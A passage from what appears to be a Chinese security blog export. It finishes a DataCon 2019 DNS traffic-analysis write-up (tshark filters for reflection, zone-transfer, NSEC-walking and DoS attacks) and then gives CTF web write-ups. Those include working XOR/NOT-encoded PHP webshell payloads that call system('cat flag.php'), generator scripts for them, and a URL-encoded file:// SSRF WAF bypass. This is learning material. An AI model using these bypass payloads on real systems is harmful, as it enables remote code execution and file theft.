enumerate(ip):</span><br><span class="line">	<span class="keyword">if</span> send[i] &gt; <span class="number">8e6</span> <span class="keyword">or</span> rece[i] &gt; <span class="number">8e6</span>:</span><br><span class="line">		ax.annotate(txt, (send[i], rece[i]))</span><br><span class="line"></span><br><span class="line">plt.xlabel(<span class="string">&#x27;send&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;receive&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>为什么要排除45.80.170.1：</p>
<p>我们可以使用命令<code>wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 45.80.170.1&quot;查看相关流量：</code></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rlk5wk9bj211k09iaci.jpg" alt=""></p>
<p>可以看出这个IP是一个DNS服务。</p>
</blockquote>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g56axqdpwaj211y0in3zd.jpg" alt=""></p>
<p>可以看到到188.141.167.218、70.85.232.160、187.199.129.12 是反射用的递归DNS，而伪造出的源地址127,130.104.152、175.222.102.169、105.191.150.205 则都是受害者。</p>
<blockquote>
<p>从图中，102.181.153.79也比较可以，但是使用<code>ip.addr==102.181.153.79</code>可以看出它的请求类型主要是MX、NS和CNAME。</p>
</blockquote>
<p><code>tshark -r q1_final.pcap -Y 'dns.qry.type in &#123;255&#125; and dns.flags.recdesired == 1 and dns.qry.name in &#123;&quot;734a5.gov&quot; &quot;d1a4.cc&quot;&#125; and not dns.flags.response == 1 and ip.src in &#123;127.130.104.152 175.222.102.169 105.191.150.205&#125;' -T fields -e frame.number -e ip.src -e dns.qry.name | awk '&#123;print $1&quot;,3&quot;&#125; &gt; Reflect.csv</code></p>
<p>上述命令把这些攻击包的标号和类型(3) 输出到了Reflect.csv。</p>
<h2 id="未授权的域传输攻击">未授权的域传输攻击</h2>
<p>继续浏览除了A(1) 和AAAA(28) 以外的DNS 请求，我们看到了未授权的DNS 域传送攻击。</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g55hmu5dvfj20w90gi0vb.jpg" alt="DNS域传送攻击"></p>
<p>我们用显示过滤器<code>dns.qry.type in &#123;252 251&#125;</code>把AXFR 和IXFR 过滤出来：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g55hpxssx8j20wl0gidi8.jpg" alt="过滤后的DNS 域传送攻击"></p>
<p>可以手工验证，有两个221.223.19.169 和一个129.191.74.107 发来的域传送请求包，以及大量的96.199.230.176 发来的域传送请求包。我们认为前面两个有可能是管理员配置不当等造成的，而最后的一个大量的请求数据包显然就是域传送攻击了。使用以下命令提取出我们认为是攻击的包：</p>
<p><code>tshark -r q1_final.pcap -Y &quot;dns.qry.type in &#123;251 252&#125; and not ip.addr in &#123;221.223.19.169 129.191.74.107&#125; and not dns.flags.response == 1&quot; -T fields -e frame.number -e ip.src | awk '&#123;print $1&quot;,4&quot;; ip[$2] += 1&#125;' &gt; AXFR.csv</code></p>
<p>上述命令把这些攻击包的标号和类型(4) 输出到了AXFR.csv。</p>
<h2 id="DNSSec-NSec-域名遍历">DNSSec NSec 域名遍历</h2>
<p>继续浏览除了A(1) 和AAAA(28) 以外的DNS 请求，可以看到DNSSec 域名遍历攻击：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g56bib7p9gj210q0ghdij.jpg" alt="DNSSec域名遍历攻击"></p>
<p>由于域名遍历攻击依赖于NSec，我们可以重新执行</p>
<p><code>tshark -r q1_final.pcap -R &quot;dns.resp.type == 47 and not dns.qry.type == 255&quot;</code></p>
<p>从原来的所有包中重新过滤所有涉及到NSec(47) 项的响应数据包：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g56cbvlgpdj210s0g0n05.jpg" alt=""></p>
<p>容易手工验证，在所有的域名遍历攻击中，攻击者只有6.116.183.244 一个人。我们可以用：</p>
<p><code>wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 6.116.183.244&quot;</code></p>
<p>过滤出6.116.183.244 发送的所有包：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g56d4z9fy7j210u0fzjue.jpg" alt=""></p>
<p>可见所有的攻击包都是SOA 或者DS 类型的。使用以下命令提取出攻击的包</p>
<p><code>tshark -r q1_final.pcap -Y 'dns and dns.qry.type in &#123;43 6&#125; and dns.flags.response == 0 and ip.src == 6.116.183.244' -T fields -e frame.number -e ip.dst | awk '&#123;print $1&quot;,1&quot;&#125;' &gt; DNSSec.csv</code></p>
<h2 id="Dos子域名遍历攻击">Dos子域名遍历攻击</h2>
<p>**切入点：**我们可以先统计一下DNS 查询到一个不存在的域名的次数及其请求发起人的IP，具体而言可以使用如下的命令：</p>
<p><code>tshark -r q1_final.pcap -Y &quot;dns and dns.flags.rcode == 3&quot; -T fields -e ip.src -e ip.dst -e dns.qry.name | awk '&#123;ip = $2; doname = substr($3, index($3,&quot;.&quot;), length($3)); c_ip_doname[ip&quot;@@@&quot;doname] += 1&#125; END &#123;for(i in c_ip_doname) print i, c_ip_doname[i]&#125;' &gt; No_such_name.csv</code></p>
<blockquote>
<p>``substr(string, start<code> [</code>, length<code> ])</code>：Return a length-character-long substring of string, starting at character number start. The first character of a string is character number one.</p>
<p>`index(str1, str2)： This searches the string <em>str1</em> for the first occurrences of the string <em>str2</em>, and returns the position in characters where that occurrence begins in the string <em>str1</em></p>
</blockquote>
<p>以域名为排序标准，查看No_such_name.csv：</p>
<p><code>cat No_such_name.csv | sort -k2nr | less</code></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g56f5ke98sj20rl0ef3z9.jpg" alt=""></p>
<p>可以看到，144.202.64.226查询了30318次*b0e.com.cn下面不存在的域名，是所有IP中次数最多的。我们可以使用：</p>
<p><code>wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 144.202.64.226&quot;</code></p>
<p>进一步查看144.202.64.226相关的包：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g576j59tyhj210s0efmzi.jpg" alt=""></p>
<p>可以看出，攻击人144.202.64.226 选了182.254.116.116 、119.29.29.29 和223.6.6.6 三个递归DNS 服务器作为中间“跳板”，<a href="http://xn--b0e-5d2e139f.com.cn">攻击b0e.com.cn</a> 的权威DNS 服务器。本来攻击者还想利用223.5.5.5 作为“跳板”的，但是看起来这台DNS 服务器没有工作，无法利用。</p>
<p>对于每个子域名，攻击人都访问了两次。第二次明显快于第一次，说明请求确实到达了权威DNS服务器并被递归服务器缓存。</p>
<p>使用下列命令可以提取出攻击的包：</p>
<p><code>tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;print $1&quot;,2&quot;&#125;' &gt; DOS.csv</code></p>
<p>使用下列命令提取“跳板机器”的dns及其被利用次数：</p>
<p><code>tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;dns[$2] += 1&#125; END &#123;for(ip in dns) print ip, dns[ip]'&#125;</code></p>
<blockquote>
<p>119.29.29.29 15719<br>
182.254.116.116 16227<br>
223.6.6.6 2247<br>
223.5.5.5 1</p>
</blockquote>
<p>使用下列命令提取询问次数不是两次的域名：</p>
<p><code>tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;domain[$3] += 1&#125; END &#123;for(i in domain) if(domain[i] != 2) print i, domain[i]&#125;' &gt; query_one_time_domain.csv</code></p>
<p>我们发现：这些域名要么是Google 的8.8.8.8，访问了四次，用于试探四个“跳板”DNS 递归服务器是否工作；要么是没有收到响应的请求，因此只访问了一次。这间接的说明了受害者的资源已经被消耗了非常多，<a href="http://xn--b0e-xi9dxh38pw5uwor.com.cn">攻击人对于b0e.com.cn</a> 权威服务器的DoS 攻击是成功的。</p>
<h2 id="分析思路总结">分析思路总结</h2>
<ul>
<li>首先查看Opcode不为0，即非Standard Query的查询数据包
<ul>
<li>特征字段：<code>dns.flags.opcode</code>
<ul>
<li><code>dns.flags.opcode != 0(Standard query)</code>
<ul>
<li><code>dns.flags.opcode == 5(Dynamic Update) </code>—&gt; 未授权的DNS Dynamic Update</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>再查看类型不为A(1)和AAAA(28)，即IPV4和IPV6的查询数据包
<ul>
<li>特征字段：<code>dns.qry.type</code>
<ul>
<li><code>dns.qry.type != 1(A) and 28(AAAA)</code>
<ul>
<li>``dns.qry.type == 255(* ALL)` —&gt; 反射放大攻击</li>
<li><code>dns.qry.type == 252(AXFR)</code> —&gt; 未授权的DNS域传输攻击</li>
<li><code>dns.qry.type == 43(DS) and 6(SOA)</code> —&gt; DNSSec 域名遍历攻击</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>最后可以统计一下返回No Such Name的响应数据包
<ul>
<li>特征字段：<code>dns.flags.rcode</code>
<ul>
<li><code>dns.flags.rcode != 0(No Error)</code>
<ul>
<li><code>dns.flags.rcode == 3(No such name)</code> —&gt; DoS攻击</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>流量分析</category>
        <category>比赛题</category>
      </categories>
      <tags>
        <tag>Wireshark</tag>
        <tag>流量分析</tag>
        <tag>DNS</tag>
        <tag>Datacon2019</tag>
      </tags>
  </entry>
  <entry>
    <title>2020“第五空间”智能安全大赛线上赛CTF-Web复盘</title>
    <url>/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web/</url>
    <content><![CDATA[<h1 id="2020“第五空间”智能安全大赛线上赛CTF-Web复盘">2020“第五空间”智能安全大赛线上赛CTF Web复盘</h1>
<h2 id="hate-php-Solved">hate-php [Solved]</h2>
<h3 id="考点">考点</h3>
<ul>
<li>无字母webshell</li>
</ul>
<h3 id="解题">解题</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/(f|l|a|g|\.|p|h|\/|;|\&quot;|\&#x27;|\`|\||\[|\]|\_|=)/i&#x27;</span>,$code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You are too good for me&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">&#x27;internal&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;You deserve better&#x27;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    assert($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到这个题第一反应就是无字母webshell，参考<a href="https://ca0y1h.top/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell/">这篇文章</a>。</p>
<p>但是又不太一样，题目有两层过滤，第一个正则过滤了一些符号了<code>flag.ph</code>中任意的字符，第二个<code>foreach</code>过滤了所有内置函数。</p>
<h4 id="取反">取反</h4>
<p>利用下面的脚本取反，构造<code>system(end(getallheaders()))</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">shell</span>):</span></span><br><span class="line">    hexbit=<span class="string">&#x27;&#x27;</span>.join(map(<span class="keyword">lambda</span> x: hex(~(-(<span class="number">256</span>-ord(x)))),shell))</span><br><span class="line">    print(hexbit)</span><br></pre></td></tr></table></figure>
<p>然后在header最后加上<code>cat flag.php</code>即可。</p>
<h4 id="异或">异或</h4>
<p>参考这篇<a href="https://www.meiyoubug.com/article/25252.html">文章</a>，简单分析一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$hhh = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到这道题更为严格：</p>
<ol>
<li>传入的字符长度不能超过18；</li>
<li>绕过preg_march正则表达式</li>
<li>count_chars()&gt;12的重复字符串绕过</li>
</ol>
<p>第一个可以用构造<code>_GET[x]</code>来绕过，重点是正则表达式的绕过，先来看一下过滤了什么字符：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200628102723.png" alt=""></p>
<p>查看当前可以通过正则检测的字符：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">256</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>,chr($i)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $i;</span><br><span class="line">        <span class="comment">#echo chr($i);</span></span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再用下面的脚本找到能异或出<code>_GET</code>的字符：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">33</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">45</span>,<span class="number">47</span>,<span class="number">58</span>,<span class="number">59</span>,<span class="number">60</span>,<span class="number">62</span>,<span class="number">63</span>,<span class="number">64</span>,<span class="number">92</span>,<span class="number">93</span>,<span class="number">94</span>,<span class="number">123</span>,<span class="number">125</span>,<span class="number">128</span>,<span class="number">129</span>,<span class="number">130</span>,<span class="number">131</span>,<span class="number">132</span>,<span class="number">133</span>,<span class="number">134</span>,<span class="number">135</span>,<span class="number">136</span>,<span class="number">137</span>,<span class="number">138</span>,<span class="number">139</span>,<span class="number">140</span>,<span class="number">141</span>,<span class="number">142</span>,<span class="number">143</span>,<span class="number">144</span>,<span class="number">145</span>,<span class="number">146</span>,<span class="number">147</span>,<span class="number">148</span>,<span class="number">149</span>,<span class="number">150</span>,<span class="number">151</span>,<span class="number">152</span>,<span class="number">153</span>,<span class="number">154</span>,<span class="number">155</span>,<span class="number">156</span>,<span class="number">157</span>,<span class="number">158</span>,<span class="number">159</span>,<span class="number">160</span>,<span class="number">161</span>,<span class="number">162</span>,<span class="number">163</span>,<span class="number">164</span>,<span class="number">165</span>,<span class="number">166</span>,<span class="number">167</span>,<span class="number">168</span>,<span class="number">169</span>,<span class="number">170</span>,<span class="number">171</span>,<span class="number">172</span>,<span class="number">173</span>,<span class="number">174</span>,<span class="number">175</span>,<span class="number">176</span>,<span class="number">177</span>,<span class="number">178</span>,<span class="number">179</span>,<span class="number">180</span>,<span class="number">181</span>,<span class="number">182</span>,<span class="number">183</span>,<span class="number">184</span>,<span class="number">185</span>,<span class="number">186</span>,<span class="number">187</span>,<span class="number">188</span>,<span class="number">189</span>,<span class="number">190</span>,<span class="number">191</span>,<span class="number">192</span>,<span class="number">193</span>,<span class="number">194</span>,<span class="number">195</span>,<span class="number">196</span>,<span class="number">197</span>,<span class="number">198</span>,<span class="number">199</span>,<span class="number">200</span>,<span class="number">201</span>,<span class="number">202</span>,<span class="number">203</span>,<span class="number">204</span>,<span class="number">205</span>,<span class="number">206</span>,<span class="number">207</span>,<span class="number">208</span>,<span class="number">209</span>,<span class="number">210</span>,<span class="number">211</span>,<span class="number">212</span>,<span class="number">213</span>,<span class="number">214</span>,<span class="number">215</span>,<span class="number">216</span>,<span class="number">217</span>,<span class="number">218</span>,<span class="number">219</span>,<span class="number">220</span>,<span class="number">221</span>,<span class="number">222</span>,<span class="number">223</span>,<span class="number">224</span>,<span class="number">225</span>,<span class="number">226</span>,<span class="number">227</span>,<span class="number">228</span>,<span class="number">229</span>,<span class="number">230</span>,<span class="number">231</span>,<span class="number">232</span>,<span class="number">233</span>,<span class="number">234</span>,<span class="number">235</span>,<span class="number">236</span>,<span class="number">237</span>,<span class="number">238</span>,<span class="number">239</span>,<span class="number">240</span>,<span class="number">241</span>,<span class="number">242</span>,<span class="number">243</span>,<span class="number">244</span>,<span class="number">245</span>,<span class="number">246</span>,<span class="number">247</span>,<span class="number">248</span>,<span class="number">249</span>,<span class="number">250</span>,<span class="number">251</span>,<span class="number">252</span>,<span class="number">253</span>,<span class="number">254</span>,<span class="number">255</span>,]</span><br><span class="line"><span class="comment">#a是上面的php脚本出来的数据，通过preg_match的字符</span></span><br><span class="line">_=[]</span><br><span class="line">G=[]</span><br><span class="line">E=[]</span><br><span class="line">T=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a[<span class="number">27</span>:]:<span class="comment">#截取a列表27后面的数据，目的是避开可视字符。我们需要不可视字符来异或</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a[<span class="number">27</span>:]:</span><br><span class="line">        tem=(i^j)</span><br><span class="line">        <span class="keyword">if</span>(chr(tem)==<span class="string">&quot;_&quot;</span>):</span><br><span class="line">            _.append((str(hex(i)[<span class="number">2</span>:])) + <span class="string">&quot;*&quot;</span> + str(hex(j)[<span class="number">2</span>:]))</span><br><span class="line">        <span class="keyword">if</span>(chr(tem)==<span class="string">&quot;G&quot;</span>):</span><br><span class="line">            G.append((str(hex(i)[<span class="number">2</span>:])) + <span class="string">&quot;*&quot;</span> + str(hex(j)[<span class="number">2</span>:]))</span><br><span class="line">        <span class="keyword">if</span> (chr(tem) == <span class="string">&quot;E&quot;</span>):</span><br><span class="line">            temp = []</span><br><span class="line">            E.append((str(hex(i)[<span class="number">2</span>:])) + <span class="string">&quot;*&quot;</span> + str(hex(j)[<span class="number">2</span>:]))</span><br><span class="line">        <span class="keyword">if</span> (chr(tem)== <span class="string">&quot;T&quot;</span>):</span><br><span class="line">            T.append((str(hex(i)[<span class="number">2</span>:])) + <span class="string">&quot;*&quot;</span> + str(hex(j)[<span class="number">2</span>:]))</span><br><span class="line">print(_)</span><br><span class="line">print(G)</span><br><span class="line">print(E)</span><br><span class="line">print(T)</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200628121017.png" alt=""></p>
<p>有很多，用第一个来对原题试一试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;($&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%87&#125;)&amp;%86&#x3D;system&amp;%87&#x3D;cat%20flag.php</span><br></pre></td></tr></table></figure>
<h3 id="后记">后记</h3>
<p>CTFhub上面现在有这道题的复现环境，但是我发现用<a href="https://www.gem-love.com/ctf/2380.html">y1ng师傅</a>和<a href="http://igml.top/2020/06/25/2020-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/">gml师傅</a>的payload都会不行，用我这个异或方式的payload可以正常回显。</p>
<h2 id="do-you-know-solved">do you know [solved]</h2>
<h3 id="考点-v2">考点</h3>
<ul>
<li>代码审计</li>
<li>SSRF + XXE</li>
</ul>
<h3 id="解题-v2">解题</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#本题无法访问外网</span></span><br><span class="line"><span class="comment">#这题真没有其他文件，请不要再开目录扫描器了，有的文件我都在注释里面告诉你们了</span></span><br><span class="line"><span class="comment">#各位大佬...这题都没有数据库的存在...麻烦不要用工具扫我了好不好</span></span><br><span class="line"><span class="comment">#there is xxe.php</span></span><br><span class="line">$poc=$_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/log|flag|hist|dict|etc|file|write/i&quot;</span> ,$poc))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no hacker&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">$ids=explode(<span class="string">&#x27;&amp;&#x27;</span>,$poc);</span><br><span class="line">$a_key=explode(<span class="string">&#x27;=&#x27;</span>,$ids[<span class="number">0</span>])[<span class="number">0</span>];</span><br><span class="line">$b_key=explode(<span class="string">&#x27;=&#x27;</span>,$ids[<span class="number">1</span>])[<span class="number">0</span>];</span><br><span class="line">$a_value=explode(<span class="string">&#x27;=&#x27;</span>,$ids[<span class="number">0</span>])[<span class="number">1</span>];</span><br><span class="line">$b_value=explode(<span class="string">&#x27;=&#x27;</span>,$ids[<span class="number">1</span>])[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$a_key||!$b_key||!$a_value||!$b_value)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;我什么都没有~&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($a_key==$b_key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;trick&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a_value!==$b_value)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(count($_GET)!=<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;be it so&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line">        $url=$value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line">    <span class="keyword">if</span> ($type != <span class="string">&#x27;file&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">#add_debug_log($param, &#x27;post_data&#x27;);</span></span><br><span class="line">        <span class="comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">30</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">180</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, <span class="literal">true</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置header</span></span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">&#x27;file&#x27;</span>) &#123;</span><br><span class="line">        $header[] = <span class="string">&quot;content-type: multipart/form-data; charset=UTF-8&quot;</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($type == <span class="string">&#x27;xml&#x27;</span>) &#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($has_json) &#123;</span><br><span class="line">        $header[] = <span class="string">&quot;content-type: application/json; charset=UTF-8&quot;</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// curl_setopt($ch, CURLOPT_USERAGENT, &#x27;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)&#x27;);</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_AUTOREFERER, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// dump($param);</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $param);</span><br><span class="line">    <span class="comment">// 要求结果为字符串且输出到屏幕上</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// 使用证书：cert 与 key 分别属于两个.pem文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $res = curl_exec($ch);</span><br><span class="line">    var_dump($res);</span><br></pre></td></tr></table></figure>
<h4 id="预期解">预期解</h4>
<p>思路：用<code>gopher</code>进行<code>ssrf</code>发送<code>post</code>请求给<code>xxe.php</code></p>
<p>先留一个坑位，等一手复现环境：<a href="https://blog.csdn.net/a3320315/article/details/106960331">https://blog.csdn.net/a3320315/article/details/106960331</a></p>
<h4 id="非预期解">非预期解</h4>
<p>这里利用了<code>$_SERVER['QUERY_STRING'];</code>不会进行url解码，但是后面赋值是$_GET赋的值，保存的是解码后的值，也就是说waf检测的是url解码前的value，直接将 file:///var/www/html/flag.php 进行url编码，可以拿到flag。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;121.36.64.91&#x2F;?a&#x3D;%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70&amp;b&#x3D;%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70</span><br></pre></td></tr></table></figure>
<h2 id="Laravel-unsolved">Laravel [unsolved]</h2>
<blockquote>
<p>源码下载：</p>
<p>链接：<a href="https://pan.baidu.com/s/1WEWSkDzyE5MXSh9CXQ-q3A">https://pan.baidu.com/s/1WEWSkDzyE5MXSh9CXQ-q3A</a><br>
提取码：p88e</p>
</blockquote>
<h3 id="考点-v3">考点</h3>
<ul>
<li>PHP反序列化 POP链</li>
</ul>
<h3 id="解题-v3">解题</h3>
<blockquote>
<p>先留一个坑，先把PHP的依赖注入的知识学完，不然看源码有点吃力。</p>
</blockquote>
<h2 id="美团外卖-unsolved">美团外卖 [unsolved]</h2>
<blockquote>
<p>源码下载：</p>
<p>链接：<a href="https://pan.baidu.com/s/1sjERSDUUOf0O63BLqW1hZw">https://pan.baidu.com/s/1sjERSDUUOf0O63BLqW1hZw</a><br>
提取码：359o</p>
</blockquote>
<h3 id="考点-v4">考点</h3>
<ul>
<li>SQL注入</li>
<li>代码审计</li>
</ul>
<h3 id="解题-v4">解题</h3>
<blockquote>
<p>暂时还没有复现环境，只能云做题了，参考：</p>
<p><a href="https://www.gem-love.com/ctf/2380.html">https://www.gem-love.com/ctf/2380.html</a></p>
<p><a href="http://igml.top/2020/06/25/2020-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/">http://igml.top/2020/06/25/2020-第五空间智能安全大赛初赛wp/</a></p>
</blockquote>
<p>扫出来www.zip源码</p>
<p>首先是个登录框，看源码就很像GXYCTF2019  EasySQLiv1.0那道题的md5绕过。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200701194151.png" alt=""></p>
